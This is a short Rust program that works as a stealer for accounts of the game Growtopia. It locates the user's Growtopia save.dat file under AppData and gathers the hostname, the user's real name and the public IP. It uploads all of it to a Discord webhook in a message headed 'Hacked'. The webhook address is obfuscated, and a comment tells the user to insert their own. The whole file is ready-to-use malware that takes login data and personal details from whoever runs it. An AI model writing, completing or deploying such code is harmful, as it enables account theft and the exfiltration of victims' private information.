use anyhow::Result;
use obfustring::obfustring;
use public_ip;
use serenity::{http::Http, model::webhook::Webhook};
use std::path::Path;
use whoami;

#[tokio::main]
async fn main() -> Result<()> {
    let file = format!(
        "C:\\Users\\{}\\AppData\\Local\\Growtopia\\save.dat",
        whoami::username()
    );
    let file_path = Path::new(&file);
    let http = Http::new("token");
    let url = obfustring!("YOUR_WEBHOOK_HERE"); //replace this with your webhook.
    let w: Webhook = Webhook::from_url(&http, &url).await?;
    let ip = public_ip::addr().await;

    let message = format!(
        "Hacked\nHostname: {}\nName: {}\nPublic IP: {:?}",
        whoami::hostname(),
        whoami::realname(),
        ip
    );

    w.execute(&http, true, |w| {
        w.content(message).username("INFO").add_file(file_path)
    })
    .await?;

    Ok(())
}
